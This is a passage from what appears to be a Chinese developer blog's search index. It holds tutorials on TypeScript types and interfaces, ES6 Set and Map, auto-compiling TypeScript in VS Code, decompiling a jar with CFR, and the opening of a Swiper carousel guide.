class="number">100</span>, <span class="literal">true</span>]</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&#x27;arr :&gt;&gt; &#x27;</span>, arr);</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="void"><a href="#void" class="headerlink" title="void"></a>void</h2><p>修饰当一个函数没有返回值时</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fn</span>(<span class="params"></span>): <span class="title">void</span> </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;fn :&gt;&gt; &#x27;</span>, fn);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="object-类型"><a href="#object-类型" class="headerlink" title="object 类型"></a>object 类型</h2><p>定义一个函数，参数时object类型 返回值也是object类型</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getobject</span>(<span class="params">obj: object</span>): <span class="title">object</span></span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&#x27;obj :&gt;&gt; &#x27;</span>, obj);</span><br><span class="line">        <span class="keyword">return</span> obj</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> ob :object = &#123;<span class="attr">name</span>: <span class="string">&quot;小明&quot;</span>, <span class="attr">age</span>:<span class="number">19</span>&#125;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&#x27;getob :&gt;&gt; &#x27;</span>,getobject(ob)); </span><br></pre></td></tr></table></figure><h2 id="联合类型"><a href="#联合类型" class="headerlink" title="联合类型"></a>联合类型</h2><p>表示取值可以为多种类型的一种</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getString</span>(<span class="params">num: number | string</span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">// 调用方式的时候可以传数子类型的也可以是字符类型的数据</span></span><br><span class="line">getString(<span class="string">&quot;123&quot;</span>)</span><br><span class="line">getString(<span class="number">123</span>)</span><br></pre></td></tr></table></figure><h2 id="类型断言"><a href="#类型断言" class="headerlink" title="类型断言"></a>类型断言</h2><p>通过类型断言方式告诉编译器, ‘相信我，我知道我自己在干什么’, 类型断言就好比其他语言中的类型转换，但不是进行特殊的数据检查和解构，它没有运行时的影响，只是在编译阶段起作用</p><p>类型断言有两种形式, 一种是尖括号语法，另一个是as语法</p><p>方式一:&lt;类型&gt; 值</p><p>方式二:值 as 类型 tsx中只能用这种方式</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getString</span>(<span class="params">num: number | string</span>) :<span class="title">number</span></span>&#123;</span><br><span class="line">        <span class="comment">// 返回传入的长度</span></span><br><span class="line">        <span class="comment">// return num.toString.length</span></span><br><span class="line">        <span class="comment">// 如果str本身就是number类型就不需要toString</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>((&lt;string&gt; num).length)&#123;</span><br><span class="line">            <span class="keyword">return</span> (&lt;string&gt; str).length</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> num.toString.length</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2 id="类型推断"><a href="#类型推断" class="headerlink" title="类型推断"></a>类型推断</h2><p>类型推断: TS会在没有明确指定类型的时候推测出一个类型</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">let</span> text = <span class="number">100</span></span><br><span class="line"> <span class="built_in">console</span>.log(<span class="string">&#x27;text :&gt;&gt; &#x27;</span>, text);</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> txt;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&#x27;txt :&gt;&gt; &#x27;</span>, txt);</span><br><span class="line"><span class="comment">// ts 将它赋予了any类型</span></span><br></pre></td></tr></table></figure><h1 id="接口"><a href="#接口" class="headerlink" title="接口"></a>接口</h1><p>TypeScrip的核心原则之一是对值所有结构进行检查，我们使用接口(interfaces) 来定义对象的类型<code>接口是对象的状态(属性)和行为(方法)的抽象</code></p><ul><li>入手</li></ul><p>创建persion的对象，需要对人的属性进行一定约束</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">id时number类型，必须有，只读</span><br><span class="line">name时string类型，必须有</span><br><span class="line">age时number类型，必须有</span><br><span class="line">sex时string类型可以没有</span><br></pre></td></tr></table></figure><p>定义上面类型的接口</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">( ()=&gt;&#123;</span><br><span class="line">    <span class="class"><span class="keyword">interface</span> <span class="title">Ipersion</span></span>&#123;</span><br><span class="line">         id: number , </span><br><span class="line">        name: string,</span><br><span class="line">        age: number,</span><br><span class="line">        sex</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">const</span> persion: Ipersion = &#123;</span><br><span class="line">        id:<span class="number">1</span>,</span><br><span class="line">        name: <span class="string">&#x27;小明&#x27;</span>,</span><br><span class="line">        age: <span class="number">19</span>,</span><br><span class="line">        sex: <span class="string">&#x27;未知&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125; ) ()</span><br></pre></td></tr></table></figure><ul><li>约束属性</li></ul><p>对上面定义的接口进行约束</p><p>属性</p><ul><li>readonly 只读属性 不允许修改</li><li>？ 表示该属性可有可无</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">( <span class="function">()=&gt;</span>&#123;</span><br><span class="line">    interface Ipersion&#123;</span><br><span class="line">        readonly id: number , <span class="comment">// 只读的属性</span></span><br><span class="line">        <span class="attr">name</span>: string,</span><br><span class="line">        <span class="attr">age</span>: number,</span><br><span class="line">        sex? <span class="comment">// 表示可有可无</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">const</span> persion: Ipersion = &#123;</span><br><span class="line">        <span class="attr">id</span>:<span class="number">1</span>,</span><br><span class="line">        <span class="attr">name</span>: <span class="string">&#x27;小明&#x27;</span>,</span><br><span class="line">        <span class="attr">age</span>: <span class="number">19</span>,</span><br><span class="line">        <span class="attr">sex</span>: <span class="string">&#x27;未知&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125; ) ()</span><br></pre></td></tr></table></figure><p>函数类型</p><p>通过接口的方式实现函数的类型, 我们需要给他定义一个调用签名</p><p>它就像一个只有参数列表和返回类型的函数定义。参数列表的每个参数都需要名字和类型</p><p>定义一个接口用来作为某个函数的类型使用</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 定义一个签名</span></span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">IsearchEunc</span></span>&#123;</span><br><span class="line">    (source: string, substring: string) :<span class="keyword">boolean</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 定义一个函数，该类型就是上面定义的接口</span></span><br><span class="line"><span class="keyword">const</span> sreachString = function (source: string, substring: string) :<span class="keyword">boolean</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> source.search(substring) &gt; -<span class="number">1</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 调用函数</span></span><br><span class="line">console.log(sreachString(<span class="string">&#x27;呵呵吧&#x27;</span>, <span class="string">&#x27;呵&#x27;</span>))</span><br></pre></td></tr></table></figure><h1 id="类的类型"><a href="#类的类型" class="headerlink" title="类的类型"></a>类的类型</h1><p>类的类型, 类的类型可以通过接口来实现</p><p> 定义一个接口</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">interface</span> Ifly&#123;</span><br><span class="line">    <span class="comment">// 该方法没有任何的实现</span></span><br><span class="line">    fly()</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>定义一个类,这个类的类型就是上面定义的接口(实际上可以理解为Ifly接口约束了当前的这个persion类)</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Persion</span> <span class="title">implements</span> <span class="title">Ifly</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 实现接口中的方法</span></span><br><span class="line">    fly(): <span class="built_in">void</span> &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&#x27;正在飞行&#x27;</span>)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>调用类中的方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">const persion = new Persion()</span><br><span class="line">persion.fly()</span><br></pre></td></tr></table></figure><h2 id="多实现接口"><a href="#多实现接口" class="headerlink" title="多实现接口"></a>多实现接口</h2><p> 定义两个个接口</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">interface Ifly&#123;</span><br><span class="line">        // 该方法没有任何的实现</span><br><span class="line">        fly()</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">      </span><br><span class="line">      interface Ieat&#123;</span><br><span class="line">        eat();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>定义一个类,实现两接口</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">class Persion implements Ifly, Ieat &#123;</span><br><span class="line">        // 实现接口中的方法</span><br><span class="line">        fly(): void &#123;</span><br><span class="line">            console.log(&#x27;正在飞行&#x27;)</span><br><span class="line">        &#125;</span><br><span class="line">        eat() &#123;</span><br><span class="line">            console.log(&#x27;正在吃东西&#x27;)</span><br><span class="line">        &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>调用各个接口的方法</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> persion = <span class="keyword">new</span> Persion()</span><br><span class="line">persion.fly()</span><br><span class="line">persion.eat()</span><br></pre></td></tr></table></figure><h2 id="接口汇总"><a href="#接口汇总" class="headerlink" title="接口汇总"></a>接口汇总</h2><p>接口可以继承多个接口，可以把多个多个汇总到一起这样类中只需继承一个汇总接口即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">   //  汇总接口</span><br><span class="line">   interface Ifly&#123;</span><br><span class="line">       fly()</span><br><span class="line">   &#125;</span><br><span class="line">     interface Ieat&#123;</span><br><span class="line">       eat();</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   interface Iplay&#123;</span><br><span class="line">       play();</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">// 继承汇总接口</span><br><span class="line">   interface Icount extends Ifly, Ieat, Iplay&#123;</span><br><span class="line"></span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">   // 定义一个类,这个类的类型就是上面定义的接口(实际上可以理解为Ifly接口约束了当前的这个persion类)</span><br><span class="line"></span><br><span class="line">   class Persion implements Icount &#123;</span><br><span class="line">       // 实现接口中的方法</span><br><span class="line">       fly(): void &#123;</span><br><span class="line">           console.log(&#x27;正在飞行&#x27;)</span><br><span class="line">       &#125;</span><br><span class="line">       eat() &#123;</span><br><span class="line">           console.log(&#x27;正在吃东西&#x27;)</span><br><span class="line">       &#125;</span><br><span class="line">       play()&#123;</span><br><span class="line">           console.log(&#x27;正在玩&#x27;)</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">   &#125;</span><br><span class="line">   const persion = new Persion()</span><br><span class="line">   persion.fly()</span><br><span class="line">   persion.eat()</span><br><span class="line">   persion.play()</span><br></pre></td></tr></table></figure><h1 id="集合Set"><a href="#集合Set" class="headerlink" title="集合Set"></a>集合Set</h1><p>ES6提供了新的数据结构Set集合, 它类似于数组，但是成员的值都是唯一的</p><p>集合实现类iterato接口所以可以使用扩展运算符[for … of] 进行遍历。</p><p>集合的属性和方法</p><p>size() 返回集合的元素个数</p><p>add() 增加一个新元素, 返回当前集合</p><p>delete() 删除元素，返回boolean值</p><p>has() 检测集合中是否包含某个元素, 返回boolean值</p><h2 id="声明一个Set"><a href="#声明一个Set" class="headerlink" title="声明一个Set"></a>声明一个Set</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> s = <span class="keyword">new</span> <span class="built_in">Set</span>([<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;3&#x27;</span>])</span><br><span class="line"><span class="comment">//Set(4) &#123;&#x27;1&#x27;, &#x27;2&#x27;, &#x27;3&#x27;, &#x27;4&#x27;&#125;</span></span><br></pre></td></tr></table></figure><p><code>它会将元素核算然后去重</code></p><h2 id="数组去重"><a href="#数组去重" class="headerlink" title="数组去重"></a>数组去重</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> ss = <span class="keyword">new</span> <span class="built_in">Set</span>([<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;3&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> result = [...new <span class="built_in">Set</span>(ss)]</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&#x27;数组去重&#x27;</span>,result);</span><br><span class="line"></span><br><span class="line"><span class="comment">//数组去重 (4) [&#x27;1&#x27;, &#x27;2&#x27;, &#x27;3&#x27;, &#x27;4&#x27;]</span></span><br></pre></td></tr></table></figure><h2 id="求交集"><a href="#求交集" class="headerlink" title="求交集"></a>求交集</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">let</span> arr2 = [<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">5</span>,<span class="number">6</span>]</span><br><span class="line">    <span class="keyword">let</span> result2 = [...new <span class="built_in">Set</span>(arr2)].filter( <span class="function"><span class="params">item</span> =&gt;</span>&#123;</span><br><span class="line">        <span class="keyword">let</span> s2 = <span class="keyword">new</span> <span class="built_in">Set</span>(arr2)</span><br><span class="line">        <span class="keyword">if</span>(s2.has(item))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;交集&#x27;</span>,result2);</span><br><span class="line"></span><br><span class="line"><span class="comment">//交集 (3) [4, 5, 6]</span></span><br></pre></td></tr></table></figure><h2 id="求并集"><a href="#求并集" class="headerlink" title="求并集"></a>求并集</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> ss = <span class="keyword">new</span> <span class="built_in">Set</span>([<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;3&#x27;</span>])</span><br><span class="line"><span class="keyword">let</span> arr2 = [<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">5</span>,<span class="number">6</span>]</span><br><span class="line"><span class="keyword">let</span> union = [<span class="keyword">new</span> <span class="built_in">Set</span>([...ss, ...arr2])]</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&#x27;并集&#x27;</span>,union[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line"><span class="comment">//并集 Set(7) &#123;&#x27;1&#x27;, &#x27;2&#x27;, &#x27;3&#x27;, &#x27;4&#x27;, 4, …&#125;</span></span><br></pre></td></tr></table></figure><h2 id="求差集"><a href="#求差集" class="headerlink" title="求差集"></a>求差集</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> diff = [...new <span class="built_in">Set</span>(arr2)].filter( <span class="function"><span class="params">item</span> =&gt;</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">new</span> <span class="built_in">Set</span>(arr2).has(item))&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&#x27;差集&#x27;</span>,diff);</span><br><span class="line"><span class="comment">//差集 (3) [4, 5, 6]</span></span><br></pre></td></tr></table></figure><h1 id="Map"><a href="#Map" class="headerlink" title="Map"></a>Map</h1><p>ES6提供了新的数据结构Set集合, 它类似于数组，但是成员的值都是唯一的</p><p>集合实现类iterato接口所以可以使用扩展运算符[for … of] 进行遍历。,map</p><p>的属性方法</p><p>size() 返回map的元素个数</p><p>set() 增加一个新元素, 返回当前Map</p><p>get() 返回键名对象的建值</p><p>has() 检测Map中是否包含某个元素, 返回boolean值</p><p>clear() 清空集合返回undefined</p><h2 id="创建"><a href="#创建" class="headerlink" title="创建"></a>创建</h2><p>创建一个空map</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> m = <span class="keyword">new</span> <span class="built_in">Map</span>()</span><br></pre></td></tr></table></figure><p>添加</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> m = <span class="keyword">new</span> <span class="built_in">Map</span>()</span><br><span class="line">m.set(<span class="string">&#x27;name&#x27;</span>, <span class="string">&#x27;小明&#x27;</span>)</span><br><span class="line"><span class="comment">//Map(1) &#123;&#x27;name&#x27; =&gt; &#x27;小明&#x27;&#125;</span></span><br></pre></td></tr></table></figure><p>依靠建获取值</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> m = <span class="keyword">new</span> <span class="built_in">Map</span>()</span><br><span class="line">m.set(<span class="string">&#x27;name&#x27;</span>, <span class="string">&#x27;小明&#x27;</span>)</span><br><span class="line"><span class="built_in">console</span>.log(m.get(<span class="string">&#x27;name&#x27;</span>));</span><br><span class="line"><span class="comment">// 小明</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> TypeScript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VsCode自动编译ts代码</title>
      <link href="/2022/03/16/%E8%87%AA%E5%8A%A8%E7%BC%96%E8%AF%91TS%E4%BB%A3%E7%A0%81/"/>
      <url>/2022/03/16/%E8%87%AA%E5%8A%A8%E7%BC%96%E8%AF%91TS%E4%BB%A3%E7%A0%81/</url>
      
        <content type="html"><![CDATA[<h1 id="VsCode自动编译ts代码"><a href="#VsCode自动编译ts代码" class="headerlink" title="VsCode自动编译ts代码"></a>VsCode自动编译ts代码</h1><p>1、生成配置文件tsconfig.json</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tsc --init</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/gwlnigth/upic/main/img/202203162113463.png"></p><p>2、修改tsconfig.json</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot;outDir&quot; : &quot;./js&quot;// 输出指定文件夹</span><br><span class="line">&quot;strict&quot; : false// 关闭严格检查模式</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/gwlnigth/upic/main/img/202203162115941.png"></p><p>2、创建ts文件编写一点ts代码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">( <span class="function">()=&gt;</span>&#123;</span><br><span class="line">    alert(<span class="number">123</span>)</span><br><span class="line">&#125; )()</span><br></pre></td></tr></table></figure><p>4、启动监视任务</p><p>终端 &gt; 运行任务 &gt; 显示所有任务 &gt; 监视tsconfig.json</p><p>5、测试</p><p><img src="https://raw.githubusercontent.com/gwlnigth/upic/main/img/202203162119432.png"></p>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> TypeScript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>反编译jar包</title>
      <link href="/2022/03/16/Java%E5%8F%8D%E7%BC%96%E8%AF%91jar%E5%8C%85/"/>
      <url>/2022/03/16/Java%E5%8F%8D%E7%BC%96%E8%AF%91jar%E5%8C%85/</url>
      
        <content type="html"><![CDATA[<h1 id="反编译jar包"><a href="#反编译jar包" class="headerlink" title="反编译jar包"></a>反编译jar包</h1><ul><li>第一步下载CFR反编译工具</li></ul><p><a href="http://www.benf.org/other/cfr//">点我下载工具</a></p><ul><li>第二步</li></ul><p>将下载反编译工具和要编译的jar包放在同一个文件夹中</p><p><img src="https://raw.githubusercontent.com/gwlnigth/upic/main/img/202203161322777.png"></p><p>打开控制台</p><p>参数:</p><p>​    -jar 后面跟上CFR编译工具</p><p>​    – outputdir 后面跟上编译好的存放路径</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">java -jar CFR编译工具的路径 需要编译的jar包路径 --outputdir 路径</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>示例：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar C:\Users\gwl\Desktop\HomeControl\src\libs\cfr-0.152.jar C:\Users\gwl\Desktop\HomeControl\src\libs\smarthome_v5.jar --outputdir C:\Users\gwl\Desktop\HomeControl\src\libs\src</span><br></pre></td></tr></table></figure><p>编译成功后即可在你存放的路径中看到反编译后的代码</p><p><code>如果不带-- outputdir 参数会将反编译后的代码直接输出到控制台上</code></p>]]></content>
      
      
      <categories>
          
          <category> JavaSE </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Swiper轮播图</title>
      <link href="/2022/03/10/%E5%BF%AB%E9%80%9F%E5%AE%9E%E7%8E%B0%E8%BD%AE%E6%92%AD%E5%9B%BE/"/>
      <url>/2022/03/10/%E5%BF%AB%E9%80%9F%E5%AE%9E%E7%8E%B0%E8%BD%AE%E6%92%AD%E5%9B%BE/</url>
      
        <content type="html"><![CDATA[<center><h1>    轮播图    </h1></center><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>swiper是一款轻量级的轮播图插件，不仅支持pc端更是为移动端而生，用它可以快速地做出一个轮播图，或者扩展使其做出复杂的轮播效果</p><h1 id="基本用法"><a href="#基本用法" class="headerlink" title="基本用法"></a>基本用法</h1><p>swiper使用需要两个文件，一个是swiper.css，里面规定了一些在这个滑动轮播插件中常用的样式，当然如果你愿意的话可以自己定义样式</p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>安装方式：</p><p>1、首先安装swiper, 5版本比较稳定</p><p><code>npm install swiper@5</code></p><p>2、引入</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;dist/css/swiper-bundle.min.css&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;dist/js/swiper-bundle.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="添加布局"><a href="#添加布局" class="headerlink" title="添加布局"></a>添加布局</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--banner轮播--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;swiper-container&quot;</span> <span class="attr">id</span>=<span class="string">&quot;mySwiper&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;swiper-wrapper&quot;</span>&gt;</span></span><br><span class="line">        <span 